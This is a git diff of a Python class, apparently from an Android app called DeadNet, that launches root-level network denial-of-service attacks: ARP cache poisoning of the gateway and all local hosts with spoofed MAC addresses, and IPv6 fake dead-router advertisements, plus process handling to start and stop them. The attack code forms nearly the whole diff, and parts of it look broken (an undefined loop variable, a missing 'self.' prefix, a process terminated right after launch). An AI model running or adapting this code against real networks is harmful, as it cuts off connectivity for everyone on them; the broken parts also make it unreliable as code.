@@ -127,49 +127,124 @@ class DeadNetAPK:
             self._do_ipv6_attack()
         self._do_ipv4_attack(host_ip)
 
-    def _do_ipv4_attack(self, host_ip: str) -> None:
-        """
-        * poison the gateway arp cache with a spoofed mac address for every possible host
-        * poison every possible host with a spoofed mac address for the gateway
-        """
-        subprocess.Popen(
-            f"su -c {self.arp_path} {self._network_interface} {host_ip} {generate_random_mac()} {self._gateway_ipv4} {self._gateway_mac} {self._my_mac}",
-            shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        subprocess.Popen(
-            f"su -c {self.arp_path} {self._network_interface} {self._gateway_ipv4} {self._gateway_mac_fake} {host_ip} ff:ff:ff:ff:ff:ff {self._my_mac}",
-            shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    def _ipv4_arp_ind_attack(self) -> None:
+        self._arp_ind_proc = subprocess.Popen(
+            ["su", "-c",
+             f"{self.arp_path} {self._network_interface} {','.join(self._host_ipv4s)} {self._gateway_mac_fake} "
+             f"{self._gateway_ipv4} {self._gateway_mac} {self._my_mac} {self._executor_sleep_interval}"],
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL,
+        )
 
-    def _do_ipv6_attack(self) -> None:
-        """
-        * broadcast a fake dead default router message
-        """
-        subprocess.Popen(f"su -c {self.nra_path} {self._gateway_mac} {self._gateway_ipv6} "
-                         f"{self._ipv6_prefix} {self._ipv6_preflen} {self._network_interface}",
-                         shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        while not self._abort:
+            time.sleep(0.5)
+
+        self._terminate_ipv4_arp_ind()
+
+    def _terminate_ipv4_arp_ind(self):
+        if self._arp_ind_proc and self._arp_ind_proc.poll() is None:
+            self._arp_ind_proc.terminate()  # SIGTERM
+            try:
+                self._arp_ind_proc.kill()   # SIGKILL
+            except Exception as e:
+                pass
+            self._arp_ind_proc.wait()  # wait for it to actually exit
+            self._arp_ind_proc = None
+
+    def _ipv4_arp_bcast_attack(self) -> None:
+        self._arp_bcast_proc = subprocess.Popen(
+            ["su", "-c",
+             f"{self.arp_path} {self._network_interface} {self._gateway_ipv4} {self._gateway_mac_fake} "
+             f"{','.join(self._host_ipv4s)} ff:ff:ff:ff:ff:ff {self._my_mac} {self._executor_sleep_interval}"],
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL,
+        )
+        while not self._abort:
+            time.sleep(0.5)
+
+        self._terminate_ipv4_arp_bcast()
+
+    def _terminate_ipv4_arp_bcast(self):
+
+        while not self._abort:
+            time.sleep(0.5)
+        if self._arp_bcast_proc and self._arp_bcast_proc.poll() is None:
+            self._arp_bcast_proc.terminate()  # SIGTERM
+            try:
+                self._arp_bcast_proc.kill()   # SIGKILL
+            except Exception as e:
+                pass
+            self._arp_bcast_proc.wait()  # wait for it to actually exit
+            self._arp_bcast_proc = None
+
+    def _ipv6_nra_attack(self) -> None:
+        # subprocess.Popen(f"su -c {self.nra_path} {self._gateway_mac} {self._gateway_ipv6} "
+        #                  f"{self._ipv6_prefix} {self._ipv6_preflen} {self._network_interface}",
+        #                  shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        # TODO add sleep
+        self._nra_proc = subprocess.Popen(
+            ["su", "-c",
+             f"{self.nra_path} {self._gateway_mac} {self._gateway_ipv6} {self._ipv6_prefix} "
+             f"{_ipv6_preflen} {self._executor_sleep_interval}"],
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL,
+        )
+
+
+
+        self._terminate_ipv6_nra_attack()
+
+    def _terminate_ipv6_nra_attack(self):
+        if self._nra_proc and self._nra_proc.poll() is None:
+            self._nra_proc.terminate()  # SIGTERM
+            try:
+                self._nra_proc.kill()   # SIGKILL
+            except Exception as e:
+                pass
+            self._nra_proc.wait()  # wait for it to actually exit
+            self._nra_proc = None
 
     def _start_workers_attack_loop(self) -> None:
-        with ThreadPoolExecutor(max_workers=self._max_workers) as executor:
-            for idx, ip in enumerate(self._host_ipv4s):
-                if self._abort:
-                    return
-                executor.submit(self._worker_attack_task, idx, ip)
-                Clock.schedule_once(lambda dt: self.print_mtd(f"{self._intro}status - {GREEN}running...{COLOR_RESET} cycle #{self._loop_count} "
-                                                              f"{GRAY}[{idx + 1} / {len(self._host_ipv4s)}]{COLOR_RESET}"))
+        # todo rename method name
+        # with ThreadPoolExecutor(max_workers=self._max_workers) as executor:
+        #     for idx, ip in enumerate(self._host_ipv4s):
+        #         if self._abort:
+        #             return
+        #         executor.submit(self._worker_attack_task, idx, ip)
+        Clock.schedule_once(lambda dt: self.print_mtd(f"{self._intro}status - {GREEN}running...{COLOR_RESET} cycle #{self._loop_count} "
+                                                      f"{GRAY}[{idx + 1} / {len(self._host_ipv4s)}]{COLOR_RESET}"))
 
-                time.sleep(self._executor_sleep_interval)
+        #self._ipv4_arp_ind_attack()
+        self._ipv4_arp_bcast_attack()
+        self._ipv6_nra_attack()
+
+        while not self._abort:
+            time.sleep(0.5)
+
+        self._terminate_all_attacks()
+
+    def _terminate_all_attacks(self):
+        self._terminate_ipv4_arp_ind()
+        self._terminate_ipv4_arp_bcast()
+        self._terminate_ipv6_nra_attack()
 
     def start_attack(self) -> None:
-        while not self._abort:
-            try:
-                self._loop_count += 1
-                self._start_workers_attack_loop()
+        try:
+            self._loop_count += 1
+            self._start_workers_attack_loop()
 
-            except Exception as e:
-                self._abort = "Error in attack loop (check debug logs)"
-                Logger.error(f"DeadNet: start_attack exception - {e}, traceback: {traceback.format_exc()}")
-            except KeyboardInterrupt:
-                Logger.info("DeadNet: start_attack user_interrupt")
-                self.user_abort()
+        except Exception as e:
+            self._abort = "Error in attack loop (check debug logs)"
+            Logger.error(f"DeadNet: start_attack exception - {e}, traceback: {traceback.format_exc()}")
+        except KeyboardInterrupt:
+            Logger.info("DeadNet: start_attack user_interrupt")
+            self.user_abort()
+
+        try:
+            # try terminating in case last time was interrupted by an exception
+            self._terminate_all_attacks()
+        except Exception as e:
+            pass
 
         if self._abort != self._user_abort_reason:
             Clock.schedule_once(lambda dt: self.print_mtd(f"{self._abort}"))
